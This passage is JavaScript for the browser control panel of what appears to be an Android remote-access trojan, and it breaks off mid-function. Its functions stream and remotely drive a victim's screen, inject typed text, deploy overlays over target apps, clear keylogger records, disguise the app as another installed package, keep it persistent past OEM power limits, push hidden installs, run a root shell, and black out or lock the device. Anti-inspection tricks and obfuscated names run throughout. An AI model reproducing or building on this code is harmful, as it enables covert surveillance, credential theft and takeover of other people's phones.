console.clear();
console.log("[系统] 正在初始化加密会话…");
console.log("[安全] 检测到隔离环境，正在应用加固遥测协议。");
console.log("[网络] 代理链路已建立：127.0.0.1:9191 -> 0.0.0.0:443");

// Security Event Listeners
document.addEventListener("contextmenu", e => e.preventDefault());
document.addEventListener("keydown", e => {
  if (123 === e.keyCode || (e.ctrlKey && e.shiftKey && (73 === e.keyCode || 74 === e.keyCode || 67 === e.keyCode)) || (e.ctrlKey && 85 === e.keyCode)) {
    return e.preventDefault(), false;
  }
});

// Global Variables & State
const mask = e => "0x_" + btoa(e.split("").reverse().join(""));
let _0x1a = 0;
let _0x1b = [];
let _0x1c = -1;
let _0x2a = false;
let _0x2b = false;
let _0x2c = null;
let _0x2d = 0;
let _0x3a = false;
let _0x3b = 0;
let _0x3c = "0";
let _0x3d = 640;
let _0x3e = 480;
let _0x3f = 40;
let _lv = null;
let _ac = false;
let audioStream = null;
let _ih = null;

// Session Stability & Render Proxy Fetch Wrapper
const originalFetch = window.fetch;
window.fetch = async function(resource, init) {
  let url = resource;
  if (typeof url === 'string' && url.startsWith('/') && !url.startsWith('/proxy') && !url.startsWith('/c2/')) {
    const urlParams = new URLSearchParams(window.location.search);
    const deviceId = urlParams.get('deviceId');
    if (deviceId) {
      const sep = url.includes('?') ? '&' : '?';
      url = `/proxy${url}${sep}deviceId=${deviceId}`;
    }
  }
  try {
    const response = await originalFetch(url, init);
    if (response.status === 401) {
      showToast("会话已过期，正在重新验证…", "error");
      setTimeout(() => {
        window.location.reload();
      }, 1000);
    }
    return response;
  } catch (error) {
    throw error;
  }
};

// Render Proxy Link Interceptor
if (window.location.pathname.startsWith('/proxy')) {
  const urlParams = new URLSearchParams(window.location.search);
  const deviceId = urlParams.get('deviceId');
  if (deviceId) {
    document.addEventListener('click', function(e) {
      const anchor = e.target.closest('a');
      if (anchor && anchor.getAttribute('href') && anchor.getAttribute('href').startsWith('/')) {
        const href = anchor.getAttribute('href');
        if (!href.startsWith('/proxy') && !href.startsWith('/c2/')) {
          e.preventDefault();
          const sep = href.includes('?') ? '&' : '?';
          window.location.href = `/proxy${href}${sep}deviceId=${deviceId}`;
        }
      }
    });
  }
}

// Dynamically Inject Responsive Mobile Layout & Touch Isolation Styles
function injectMobileStyles() {
  if (document.getElementById("ghost-responsive-style")) return;
  const style = document.createElement("style");
  style.id = "ghost-responsive-style";
  style.textContent = `
    .ghost-screen-wrapper, .ghost-viewport-container {
      width: 100% !important;
      max-width: 360px !important;
      margin: 0 auto !important;
      display: flex !important;
      flex-direction: column !important;
      align-items: center !important;
      justify-content: center !important;
      box-sizing: border-box !important;
      padding: 8px !important;
      overflow: hidden !important;
      touch-action: none !important;
      -webkit-user-select: none !important;
      user-select: none !important;
    }
    #ghost-screen-stream {
      width: 100% !important;
      max-width: 100% !important;
      height: auto !important;
      max-height: 70vh !important;
      object-fit: contain !important;
      display: block !important;
      margin: 0 auto !important;
      border-radius: 14px !important;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.55) !important;
      touch-action: none !important;
      -webkit-touch-callout: none !important;
      -webkit-user-select: none !important;
      user-select: none !important;
      cursor: pointer !important;
    }
  `;
  document.head.appendChild(style);
}

// UI Info Popup
function showInfo(e, t, o) {
  if (e) e.stopPropagation();
  let n = document.getElementById("info-popup");
  if (!n) {
    n = document.createElement("div");
    n.id = "info-popup";
    Object.assign(n.style, {
      position: "fixed",
      background: "rgba(8, 12, 18, 0.98)",
      border: "1px solid var(--neon-cyan)",
      color: "#fff",
      padding: "16px",
      borderRadius: "12px",
      zIndex: "20000",
      width: "300px",
      boxShadow: "0 20px 60px rgba(0,0,0,0.9)",
      transition: "opacity 0.25s ease",
      opacity: "0",
      display: "none",
      pointerEvents: "auto"
    });
    document.body.appendChild(n);
  }

  const triggerBtn = e ? (e.currentTarget || e.target) : null;
  let titleColor = "var(--neon-cyan)";
  if (triggerBtn) {
    const parentLabel = triggerBtn.closest(".info-label");
    if (parentLabel && parentLabel.style.color) {
      titleColor = parentLabel.style.color;
    } else {
      const parentCard = triggerBtn.closest("h2, .card, .info-item, .info-section");
      if (parentCard) {
        const h2El = parentCard.tagName.toLowerCase() === "h2" ? parentCard : parentCard.querySelector("h2, .info-label");
        if (h2El && h2El.style.color) {
          titleColor = h2El.style.color;
        } else if (h2El) {
          const computedColor = window.getComputedStyle(h2El).color;
          if (computedColor && computedColor !== "rgba(0, 0, 0, 0)") {
            titleColor = computedColor;
          }
        }
      }
    }
  }

  const rect = triggerBtn ? triggerBtn.getBoundingClientRect() : { top: 100, left: 100, bottom: 120, width: 20 };
  let topPos = rect.bottom + 8;
  let leftPos = rect.left + (rect.width / 2) - 150;

  if (topPos + 160 > window.innerHeight) {
    topPos = rect.top - 150;
  }
  if (topPos < 10) topPos = 10;

  if (leftPos < 10) leftPos = 10;
  if (leftPos + 300 > window.innerWidth - 10) {
    leftPos = window.innerWidth - 310;
  }

  n.style.top = topPos + "px";
  n.style.left = leftPos + "px";
  n.style.borderColor = titleColor;
  n.innerHTML = `<div style="font-weight:bold; color:${titleColor}; font-family:Orbitron, sans-serif; font-size:0.8rem; margin-bottom:8px; text-shadow:0 0 10px ${titleColor};">${t}</div><div style="font-size:0.72rem; opacity:0.9; font-family:'JetBrains Mono', monospace; line-height:1.5;">${o}</div>`;
  n.style.display = "block";
  setTimeout(() => n.style.opacity = "1", 10);
}

function hideInfo() {
  const e = document.getElementById("info-popup");
  if (e && "block" === e.style.display) {
    e.style.opacity = "0";
    setTimeout(() => e.style.display = "none", 300);
  }
}

function updateNav() {
  const rawPath = window.location.pathname;
  let n = rawPath.replace(/^\/proxy/, "") || "/";
  if (!n.startsWith("/")) n = "/" + n;

  const e = document.querySelectorAll(".nav a, .bottom-nav-link");
  e.forEach(item => {
    const t = item.getAttribute("href");
    let o = false;
    if ("/" === t || "/terminal" === t) {
      o = ("/" === n || "/terminal" === n);
    } else if ("/files" === t) {
      o = (n.startsWith("/files") || n.startsWith("/device/apps"));
    } else if ("/device" === t) {
      o = (n.startsWith("/device") && !n.includes("/apps"));
    } else {
      o = (t && t !== "/" && n.startsWith(t));
    }

    if (o) {
      item.classList.add("active");
    } else {
      item.classList.remove("active");
    }
  });
}

function showToast(e, t = "info") {
  let o = document.getElementById("c2-toast");
  if (!o) {
    o = document.createElement("div");
    o.id = "c2-toast";
    Object.assign(o.style, {
      position: "fixed",
      bottom: "15%",
      left: "50%",
      transform: "translateX(-50%)",
      background: "rgba(15,15,25,0.98)",
      border: "1px solid var(--neon-cyan)",
      color: "#fff",
      padding: "16px 32px",
      borderRadius: "12px",
      zIndex: "10000",
      fontSize: "0.9rem",
      textAlign: "center",
      minWidth: "320px",
      boxShadow: "0 20px 60px rgba(0,0,0,0.9)",
      transition: "all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275)",
      opacity: "0",
      display: "none",
      fontFamily: "Orbitron, sans-serif",
      letterSpacing: "1px"
    });
    document.body.appendChild(o);
  }
  o.style.borderColor = "error" === t ? "var(--danger)" : "var(--neon-cyan)";
  o.innerHTML = e;
  o.style.display = "block";
  setTimeout(() => {
    o.style.opacity = "1";
    o.style.bottom = "20%";
  }, 10);
  setTimeout(() => {
    o.style.opacity = "0";
    o.style.bottom = "15%";
    setTimeout(() => o.style.display = "none", 300);
  }, 3800);
}

// Repair & Optimization Functions
function repairProtocol() {
  _0x4a("修复链路", "正在重新同步后台遥测协议…", () => {
    fetch("/gps/request-permission");
    fetch("/device/fix-persistence")
      .then(e => e.json())
      .then(e => { showToast(e.message); })
      .catch(e => {
        console.error(e);
        showToast("连接失败", "error");
      });
  });
}

function deployStealthMasquerade() {
  const sel = document.getElementById("stealth-app-select");
  if (!sel || !sel.value) {
    showToast("请选择一个已安装的应用", "error");
    return;
  }
  const pkg = sel.value;
  showToast("正在部署伪装…");
  fetch("/device/masquerade?pkg=" + encodeURIComponent(pkg))
    .then(r => {
      showToast("伪装已部署");
      setTimeout(() => location.reload(), 1500);
    })
    .catch(err => showToast("伪装失败", "error"));
}

function dispatchPermissionSequence() {
  showToast("权限弹窗请求已发送");
  fetch("/device/request-permissions")
    .then(e => e.json())
    .then(e => { showToast(e.message); })
    .catch(e => {
      console.error(e);
      showToast("请求失败", "error");
    });
}

function optimizeStability() {
  _0x4a("稳定性优化", "正在绕过 OEM 电源限制…", () => {
    fetch("/device/optimize-stability")
      .then(e => e.json())
      .then(e => { showToast("稳定性同步：请按 OEM 指引开启自启动"); })
      .catch(e => {
        console.error(e);
        showToast("稳定性同步失败", "error");
      });
  });
}

function deepRepair() {
  _0x4a("核心修复", "正在打开系统深度配置以解决环境冲突…", () => {
    fetch("/device/deep-repair")
      .then(e => e.json())
      .then(e => { showToast("设置已打开：请在设备上完成修复"); })
      .catch(e => {
        console.error(e);
        showToast("修复链路失败", "error");
      });
  });
}

function injectTrust() {
  showToast("绕过序列已启动");
  fetch("/device/inject-trust")
    .then(e => e.json())
    .then(e => { showToast("绕过已启动：请等待安装提示"); })
    .catch(e => {
      console.error(e);
      showToast("绕过失败", "error");
    });
}

function initiateHeal() {
  _0x4a("自愈协议", "正在启动自愈序列以恢复持久化层…", () => {
    ghostAction("autoheal");
  });
}

// Tactical Modal Helper
function _0x4a(e, t, o) {
  let n = document.getElementById("tactical-modal");
  if (!n) {
    n = document.createElement("div");
    n.id = "tactical-modal";
    Object.assign(n.style, {
      position: "fixed",
      top: "0",
      left: "0",
      width: "100%",
      height: "100%",
      background: "rgba(0,0,0,0.85)",
      zIndex: "30000",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      opacity: "0",
      transition: "opacity 0.4s ease",
      backdropFilter: "blur(10px)"
    });
    n.innerHTML = '<div style="background:#0a0a0f; border:1px solid var(--neon-cyan); padding:40px; border-radius:15px; width:450px; text-align:center; box-shadow:0 20px 60px rgba(0,0,0,0.8);"><div style="font-family:Orbitron, sans-serif; color:var(--neon-cyan); font-size:1.2rem; margin-bottom:15px;" id="tm-title">TACTICAL_INITIATION</div><div style="color:#aaa; font-size:0.85rem; margin-bottom:30px; min-height:40px;" id="tm-msg">正在准备远程系统命令…</div><div style="width:100%; height:4px; background:rgba(255,255,255,0.05); border-radius:2px; overflow:hidden; margin-bottom:30px;"><div id="tm-progress" style="width:0%; height:100%; background:var(--neon-cyan); box-shadow:0 0 10px var(--neon-cyan); transition: width 0.3s ease;"></div></div><div style="display:flex; justify-content:center; gap:20px;"><button id="tm-cancel" class="btn btn-small" style="border-color:#555; color:#555;">取消</button></div></div>';
    document.body.appendChild(n);
  }

  document.getElementById("tm-title").innerText = e;
  document.getElementById("tm-msg").innerText = t;
  document.getElementById("tm-progress").style.width = "0%";
  n.style.display = "flex";
  setTimeout(() => n.style.opacity = "1", 10);

  let aborted = false;
  const abortSequence = () => {
    aborted = true;
    n.style.opacity = "0";
    setTimeout(() => n.style.display = "none", 400);
  };

  document.getElementById("tm-cancel").onclick = abortSequence;
  let progressVal = 0;
  const progressInterval = setInterval(() => {
    if (aborted) {
      clearInterval(progressInterval);
    } else {
      progressVal += 6.5 * Math.random();
      if (progressVal >= 100) {
        progressVal = 100;
        clearInterval(progressInterval);
        setTimeout(() => {
          if (!aborted) {
            abortSequence();
            o();
          }
        }, 400);
      }
      document.getElementById("tm-progress").style.width = progressVal + "%";
    }
  }, 80);
}

// Authentication & Password Settings
async function handleLogin(e) {
  e.preventDefault();
  const t = document.getElementById("password").value;
  const o = document.getElementById("status-header");
  const n = document.getElementById("uplink-btn");
  n.disabled = true;
  n.style.opacity = "0.5";
  try {
    let loginEndpoint = "./login";
    const res = await fetch(loginEndpoint, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: "password=" + encodeURIComponent(mask(t)) + "&json=true"
    });
    const data = await res.json();
    if (data.success) {
      o.textContent = "访问已授权";
      o.style.color = "#39ff14";
      o.style.textShadow = "none";
      setTimeout(() => {
        window.location.reload();
      }, 800);
    } else {
      o.textContent = "密码错误";
      o.style.color = "#ff3131";
      o.style.textShadow = "none";
      n.disabled = false;
      n.style.opacity = "1";
      setTimeout(() => {
        o.textContent = "受限访问";
        o.style.color = "#00f2ff";
        o.style.textShadow = "none";
      }, 2000);
    }
  } catch (err) {
    console.error(err);
    n.disabled = false;
    n.style.opacity = "1";
  }
}

async function updatePassword(e) {
  e.preventDefault();
  const inputEl = e.target.querySelector('input[name="new_password"]');
  if (!inputEl) return;
  const t = inputEl.value;
  if (!t || !t.trim()) {
    showToast("密码不能为空", "error");
    return;
  }
  try {
    const res = await fetch("/settings/password", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: "new_password=" + encodeURIComponent(mask(t.trim()))
    });
    const text = await res.text();
    document.open();
    document.write(text);
    document.close();
  } catch (err) {
    console.error(err);
  }
}

// Logs View
function fetchLogs() {
  const n = document.getElementById("log-terminal");
  if (!n) return;
  fetch("/terminal/logs?since=" + _0x1a)
    .then(e => e.json())
    .then(e => {
      if (e.reset) {
        n.innerHTML = "";
        _0x1a = 0;
      }
      if (e.logs && e.logs.length > 0) {
        const autoScroll = n.scrollHeight - n.scrollTop <= n.clientHeight + 50;
        if (_0x1a === 0) n.innerHTML = "";
        e.logs.forEach(logLine => {
          const div = document.createElement("div");
          div.style.marginBottom = "4px";
          let cleanText = logLine;
          if (logLine.startsWith("[I]")) {
            div.style.color = "var(--encrypted-blue)";
            div.style.fontWeight = "bold";
            div.style.textShadow = "none";
            cleanText = logLine.substring(3);
          } else if (logLine.startsWith("[C]")) {
            div.style.color = "var(--danger)";
            div.style.textShadow = "none";
            div.style.fontWeight = "bold";
            cleanText = logLine.substring(3);
          } else if (logLine.startsWith("[W]")) {
            div.style.color = "var(--neon-orange)";
            cleanText = logLine.substring(3);
          } else if (logLine.startsWith("[S]")) {
            div.style.color = "var(--neon-green)";
            cleanText = logLine.substring(3);
          } else {
            div.style.color = "var(--neon-cyan)";
          }
          div.innerText = cleanText;
          n.appendChild(div);
        });
        _0x1a = e.last_id;
        if (autoScroll) {
          n.scrollTop = n.scrollHeight;
        }
      }
    })
    .catch(e => console.error("Log fetch failed", e));
}

function clearSessionLogs() {
  showToast("正在清除活动日志…");
  fetch("/terminal/clear-logs").then(() => {
    _0x1a = 0;
    fetchLogs();
  });
}

// Device Commands & Hub Openers
function openAccessibility() {
  fetch("/device/open-accessibility")
    .then(e => e.json())
    .then(e => { showToast("无障碍设置已打开"); })
    .catch(e => {
      console.error(e);
      showToast("链接失败", "error");
    });
}

function openNotifications() {
  fetch("/device/open-notifications")
    .then(e => e.json())
    .then(e => { showToast("通知设置已打开"); })
    .catch(e => {
      console.error(e);
      showToast("链接失败", "error");
    });
}

function deviceCmd(e) {
  fetch("/device/" + e)
    .then(e => e.json())
    .then(e => {
      if (e && e.redirect) window.location.href = e.redirect;
    });
}

function restartServer() {
  if (confirm("重启后台服务？界面将短暂断开。")) {
    fetch("/terminal/restart");
    setTimeout(() => location.reload(), 2500);
  }
}

function selfDestruct() {
  if (confirm("警告：此操作将移除所有系统稳定性协议并卸载应用。是否继续？")) {
    fetch("/device/self-destruct");
  }
}

function sendToast() {
  const e = document.getElementById("toast-msg").value;
  if (e) fetch("/device/toast?msg=" + encodeURIComponent(e));
}

function toggleColorPicker(e) {
  if (e) e.stopPropagation();
  const palette = document.getElementById("color-picker-palette");
  if (palette) {
    palette.style.display = "none" === palette.style.display ? "grid" : "none";
  }
}

function pickToastColor(e) {
  document.getElementById("toast-color-val").value = e;
  document.getElementById("toast-color-btn").style.background = e;
  const palette = document.getElementById("color-picker-palette");
  if (palette) palette.style.display = "none";
}

function sendEnhancedToast() {
  const a = document.getElementById("toast-msg").value;
  if (!a) return showToast("请先输入消息", "error");
  const e = document.getElementById("toast-anim").value;
  if ("burnt" === e) {
    showToast("正在发送弹窗");
    for (let i = 0; i < 15; i++) {
      setTimeout(() => {
        const size = Math.floor(40 * Math.random()) + 15;
        const y = Math.floor(1600 * Math.random()) + 100;
        const dur = Math.floor(7000 * Math.random()) + 3000;
        const anim = ["pop", "static", "scroll"][Math.floor(3 * Math.random())];
        const color = document.getElementById("toast-color-val").value;
        fetch("/device/toast?msg=" + encodeURIComponent(a) + "&size=" + size + "&y=" + y + "&duration=" + dur + "&anim=" + anim + "&color=" + encodeURIComponent(color));
      }, 200 * i);
    }
  } else {
    const size = document.getElementById("toast-size").value;
    const y = document.getElementById("toast-y").value;
    const dur = document.getElementById("toast-dur").value;
    const color = document.getElementById("toast-color-val").value;
    fetch("/device/toast?msg=" + encodeURIComponent(a) + "&size=" + size + "&y=" + y + "&duration=" + dur + "&anim=" + e + "&color=" + encodeURIComponent(color))
      .then(res => res.json())
      .then(data => {
        if (data.success) showToast("弹窗已发送");
      });
  }
}

function openApp() {
  const e = document.getElementById("app-selector").value;
  if (e) fetch("/device/open-app?pkg=" + encodeURIComponent(e));
}

function openUrl() {
  const e = document.getElementById("target-url").value;
  if (e) fetch("/device/open-url?url=" + encodeURIComponent(e));
}

function executeShell() {
  const e = document.getElementById("shell-cmd");
  const t = e.value;
  const o = document.getElementById("shell-output");
  if (t) {
    _0x1b.push(t);
    if (_0x1b.length > 50) _0x1b.shift();
    _0x1c = -1;
    const div = document.createElement("div");
    div.style.color = "#fff";
    div.style.marginTop = "10px";
    const promptElement = document.getElementById("terminal-prompt");
    const promptText = promptElement ? promptElement.innerText : "root@Android:~#";
    div.innerHTML = '<span style="color:var(--terminal-green)">' + promptText + "</span> " + t;
    o.appendChild(div);
    e.value = "";
    fetch("/device/shell?cmd=" + encodeURIComponent(t))
      .then(res => res.json())
      .then(data => {
        const tu = document.getElementById("termux-uplink");
        const symbol = data.termux_available ? "$" : "#";
        const currentPath = data.current_path || "/sdcard";

        if (data.termux_available) {
          if (tu) tu.style.display = "block";
        } else {
          if (tu) tu.style.display = "none";
        }

        if (t.trim().toLowerCase() === "exit") {
          window.isKaliMode = false;
        } else if (t.startsWith("nh") || t.startsWith("nethunter") || t.startsWith("kali") || t.startsWith("nmap") || t.startsWith("msfconsole") || t.startsWith("sqlmap") || t.startsWith("hydra") || t.startsWith("wifite") || t.startsWith("aircrack-ng")) {
          window.isKaliMode = true;
        }
        const userPrefix = window.isKaliMode ? "kali@android" : "root@Android";
        const p = document.getElementById("terminal-prompt");
        if (p) {
          p.style.color = window.isKaliMode ? "var(--neon-cyan)" : "var(--terminal-green)";
          p.innerText = userPrefix + ":" + currentPath + symbol;
        }

        if (data.output === "__CLEAR_SCREEN__") {
          if (o) o.innerHTML = "";
          return;
        }
        if (o) {
          const outDiv = document.createElement("div");
          outDiv.style.whiteSpace = "pre-wrap";
          const rawText = data.output || "无输出";
          outDiv.innerHTML = rawText.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
          o.appendChild(outDiv);
          o.scrollTop = o.scrollHeight;
        }
      })
      .catch(() => {
        if (o) {
          const errDiv = document.createElement("div");
          errDiv.style.color = "var(--danger)";
          errDiv.textContent = "[错误] 连接丢失";
          o.appendChild(errDiv);
        }
      });
  }
}

// Ghost Screen Controls with Smooth Touch and Viewport Scaling
function enforceGhostViewportScaling() {
  const streamImg = document.getElementById("ghost-screen-stream");
  if (streamImg) {
    streamImg.style.width = "100%";
    streamImg.style.maxWidth = "360px";
    streamImg.style.height = "auto";
    streamImg.style.maxHeight = "70vh";
    streamImg.style.objectFit = "contain";
    streamImg.style.display = "block";
    streamImg.style.margin = "0 auto";
    streamImg.style.borderRadius = "12px";
    streamImg.style.touchAction = "none";
    streamImg.style.webkitUserSelect = "none";
    streamImg.style.userSelect = "none";

    const parent = streamImg.parentElement;
    if (parent) {
      parent.style.maxWidth = "100%";
      parent.style.boxSizing = "border-box";
      parent.style.overflow = "hidden";
      parent.style.touchAction = "none";
    }

    if (!streamImg.dataset.touchInitialized) {
      streamImg.dataset.touchInitialized = "true";

      streamImg.addEventListener("touchstart", function(e) {
        if (e.cancelable) e.preventDefault();
        startGhostDrag(e);
      }, { passive: false });

      streamImg.addEventListener("touchend", function(e) {
        if (e.cancelable) e.preventDefault();
        endGhostDrag(e);
      }, { passive: false });

      streamImg.addEventListener("touchmove", function(e) {
        if (e.cancelable) e.preventDefault();
      }, { passive: false });
    }
  }
}

function startGhostScreen() {
  _0x2a = true;
  enforceGhostViewportScaling();
  const statusCard = document.getElementById("ghost-screen-status");
  if (statusCard) statusCard.style.display = "none";
  const btn = document.getElementById("ghost-toggle-btn");
  if (btn) {
    btn.innerText = "结束";
    btn.style.borderColor = "var(--danger)";
    btn.style.color = "var(--danger)";
  }
  refreshGhostScreen();
}

function stopGhostScreen() {
  _0x2a = false;
  const statusCard = document.getElementById("ghost-screen-status");
  if (statusCard) {
    statusCard.style.display = "block";
    statusCard.innerText = "屏幕待机";
  }
  const btn = document.getElementById("ghost-toggle-btn");
  if (btn) {
    btn.innerText = "开始查看";
    btn.style.borderColor = "var(--neon-green)";
    btn.style.color = "var(--neon-green)";
  }
  const streamImg = document.getElementById("ghost-screen-stream");
  if (streamImg) streamImg.src = "";
}

function toggleGhostScreen() {
  if (_0x2a) {
    stopGhostScreen();
  } else {
    startGhostScreen();
  }
}

function refreshGhostScreen() {
  if (_0x2a) {
    const streamImg = document.getElementById("ghost-screen-stream");
    const statusCard = document.getElementById("ghost-screen-status");
    enforceGhostViewportScaling();
    const img = new Image();
    img.src = "/ghost/screenshot?t=" + Date.now();
    img.onload = () => {
      if (_0x2a && streamImg) {
        streamImg.src = img.src;
        if (statusCard) statusCard.style.display = "none";
        setTimeout(refreshGhostScreen, _0x2b ? 5000 : 200);
      }
    };
    img.onerror = () => {
      if (_0x2a) setTimeout(refreshGhostScreen, 300);
    };
  }
}

function startGhostDrag(e) {
  if (e && e.stopPropagation) e.stopPropagation();
  const streamImg = document.getElementById("ghost-screen-stream");
  if (!streamImg) return;

  const rect = streamImg.getBoundingClientRect();
  const touchObj = (e.touches && e.touches.length > 0) ? e.touches[0] : e;
  const clientX = touchObj.clientX;
  const clientY = touchObj.clientY;

  const posX = Math.max(0, Math.min(100, ((clientX - rect.left) / rect.width) * 100));
  const posY = Math.max(0, Math.min(100, ((clientY - rect.top) / rect.height) * 100));

  _0x2c = {
    x: posX,
    y: posY,
    t: Date.now()
  };
}

function endGhostDrag(e) {
  if (e && e.stopPropagation) e.stopPropagation();
  if (!_0x2c) return;

  const now = Date.now();
  if (now - _0x2d < 120) return; // Debounce rapid multi-taps
  _0x2d = now;

  const streamImg = document.getElementById("ghost-screen-stream");
  if (!streamImg) return;

  const rect = streamImg.getBoundingClientRect();
  const touchObj = (e.changedTouches && e.changedTouches.length > 0) ? e.changedTouches[0] : e;
  const clientX = touchObj.clientX;
  const clientY = touchObj.clientY;

  const currentX = Math.max(0, Math.min(100, ((clientX - rect.left) / rect.width) * 100));
  const currentY = Math.max(0, Math.min(100, ((clientY - rect.top) / rect.height) * 100));
  const dragDuration = now - _0x2c.t;
  const distance = Math.sqrt(Math.pow(currentX - _0x2c.x, 2) + Math.pow(currentY - _0x2c.y, 2));

  if (distance < 2.5) {
    // Precise single tap / click action
    fetch("/ghost/interact?action=click&px=" + _0x2c.x.toFixed(2) + "&py=" + _0x2c.y.toFixed(2));
  } else {
    // Intentional drag / swipe action
    fetch("/ghost/interact?action=swipe&px1=" + _0x2c.x.toFixed(2) + "&py1=" + _0x2c.y.toFixed(2) + "&px2=" + currentX.toFixed(2) + "&py2=" + currentY.toFixed(2) + "&d=" + Math.max(dragDuration, 100));
  }
  _0x2c = null;
}

function openSettings() {
  fetch("/ghost/interact?action=settings");
}

function deployOverlay() {
  const e = document.getElementById("overlay-type").value;
  if (!e) return showToast("请先选择目标", "error");
  showToast("覆盖层指令已发送");
  fetch("/ghost/deploy-overlay?type=" + e)
    .then(res => res.json())
    .then(() => { showToast("覆盖层已部署"); });
}

function terminateOverlay() {
  fetch("/ghost/deploy-overlay")
    .then(res => res.json())
    .then(() => { showToast("覆盖层已结束"); });
}

function toggleLock() {
  fetch("/ghost/lock").then(() => {
    showToast("指令已发送：系统锁定");
    checkGhostStatus();
  });
}

function toggleBlackout() {
  const isActivating = document.getElementById("blackout-btn").innerText.includes("ACTIVATE");
  showToast(isActivating ? "黑屏协议已启用" : "正在恢复屏幕背光…");
  fetch("/ghost/interact?action=" + (isActivating ? "blackout_on" : "blackout_off")).then(() => checkGhostStatus());
}

function toggleAutoPilot() {
  fetch("/stealth?action=autopilot")
    .then(res => res.json())
    .then(data => {
      const btn = document.getElementById("autopilot-btn");
      if (data.autopilot) {
        btn.innerText = "自动驾驶已开启";
        btn.classList.add("btn-engaged-yellow");
        btn.style.color = "#000";
        btn.style.background = "#ffff00";
      } else {
        btn.innerText = "自动驾驶已关闭";
        btn.classList.remove("btn-engaged-yellow");
        btn.style.color = "var(--neon-yellow)";
        btn.style.background = "rgba(255, 255, 255, 0.03)";
      }
    });
}

function ghostType() {
  const e = document.getElementById("ghost-type-input");
  const t = e.value;
  if (t) fetch("/ghost/interact?action=type&text=" + encodeURIComponent(t));
  e.value = "";
}

function transmitVoicePayload() {
  const input = document.getElementById("tts-input");
  if (!input || !input.value.trim()) { showToast("请输入要播放的文本", "error"); return; }
  const text = input.value.trim();
  showToast("正在传输语音…");
  fetch("/audio/speak?text=" + encodeURIComponent(text))
    .then(r => r.json())
    .then(d => {
      if (d.success) { showToast("语音已排队"); input.value = ""; }
      else showToast("语音发送失败", "error");
    })
    .catch(() => showToast("传输错误", "error"));
}

// Base Actions
function ghostAction(e) {
  fetch("/ghost/interact?action=" + e);
}

function clearGhostLogs() {
  showToast("正在清除键盘记录…");
  fetch("/ghost/clear").then(() => refreshGhostLogs());
}

// Tree Traversal Inspector
async function refreshInspector() {
  const o = document.getElementById("inspector-tree");
  if (!o) return;
  o.innerHTML = '<span style="color:var(--neon-cyan)">[扫描中] 正在遍历无障碍树…</span>';
  try {
    const data = await (await fetch("/ghost/inspector")).json();
    if (data.error) {
      o.innerHTML = '<span style="color:var(--danger)">[ERROR] ' + data.error + "</span>";
    } else {
      o.innerHTML = "";
      const div = document.createElement("div");
      div.style.padding = "12px 18px";
      div.style.marginBottom = "20px";
      div.style.background = "#1b1b1f";
      div.style.border = "1px solid #26262b";
      div.style.borderRadius = "10px";
      div.style.boxShadow = "none";

      let pkgName = data.package;
      let iconHtml = "&#128241;";
      if (["launcher", "trebuchet", "home", "desktop", "nexuslauncher"].some(kw => pkgName.toLowerCase().includes(kw))) {
        pkgName = "系统桌面";
        iconHtml = "&#127968;";
      } else if (pkgName.includes(".android.settings")) {
        pkgName = "系统设置";
      } else if (pkgName.includes(".vending")) {
        pkgName = "Google Play 商店";
      } else if (pkgName.includes(".chrome")) {
        pkgName = "Chrome 浏览器";
      } else if (pkgName.includes(".messaging") || pkgName.includes(".sms")) {
        pkgName = "短信 / 消息";
      } else if (pkgName.includes(".contacts")) {
        pkgName = "通讯录";
      }

      div.innerHTML = `<div style="display:flex; align-items:center; gap:12px; width:100%;"><div style="font-size:1.6rem; flex-shrink:0; filter: drop-shadow(0 0 5px var(--neon-cyan));">${iconHtml}</div><div style="flex-grow:1; min-width:0; overflow:hidden;"><div style="font-size:0.6rem; color:var(--neon-cyan); letter-spacing:1.5px; font-weight:bold; opacity:0.8; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">当前界面上下文</div><div style="font-size:1.1rem; font-weight:900; color:#fff; text-shadow:0 0 10px rgba(255,255,255,0.2); white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${pkgName}</div><div style="font-size:0.55rem; color:rgba(255,255,255,0.4); font-family:monospace; margin-top:2px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${data.package}</div></div><div style="text-align:right; font-size:0.55rem; color:var(--neon-green); opacity:0.7; font-weight:bold; flex-shrink:0; line-height:1.2; min-width:80px;">安全层 V2<br>系统调用活跃</div></div>`;
      o.appendChild(div);
      _0x5a(data.tree, o, 0, data.width, data.height);
    }
  } catch (err) {
    o.innerHTML = '<span style="color:var(--danger)">[致命] 检查器超时</span>';
  }
}

function _0x5a(n, r, a, l, s) {
  if (!n) return;
  const e = document.createElement("div");
  e.style.display = "flex";
  e.style.alignItems = "center";
  e.style.padding = "8px 12px";
  e.style.marginLeft = 16 * a + "px";
  e.style.borderLeft = "1px solid rgba(0, 242, 255, 0.12)";
  e.style.whiteSpace = "nowrap";
  e.style.transition = "all 0.2s cubic-bezier(0.4, 0, 0.2, 1)";
  e.style.cursor = "pointer";
  e.style.borderRadius = "4px";

  const shortClass = n.class.split(".").pop();
  let bulletIcon = "&#9634;";
  if (n.class.toLowerCase().includes("button")) bulletIcon = "&#9007;";
  else if (n.class.toLowerCase().includes("edit")) bulletIcon = "&#9998;";
  else if (n.class.toLowerCase().includes("text")) bulletIcon = "&#8443;";
  else if (n.class.toLowerCase().includes("image")) bulletIcon = "&#128443;";
  else if (n.class.toLowerCase().includes("layout")) bulletIcon = "&#128392;";
  else if (n.class.toLowerCase().includes("recycler") || n.class.toLowerCase().includes("list")) bulletIcon = "&#128220;";

  e.title = `类: ${n.class}\n边界: ${n.x},${n.y} [${n.w}x${n.h}]\n可见: ${n.visible}\n可聚焦: ${n.focusable}`;
  let innerMarkup = `<span style="color:var(--neon-cyan); margin-right:10px; font-size:0.9rem; opacity:0.8;">${bulletIcon}</span><span style="color:var(--neon-green); font-weight:900; font-size:0.85rem; letter-spacing:0.5px;">${shortClass}</span>`;

  if (n.resId) {
    innerMarkup += `<span style="color:var(--neon-orange); margin-left:10px; font-size:0.7rem; opacity:0.8; font-family:monospace;">#${n.resId.split("/").pop()}</span>`;
  }
  if (n.text) {
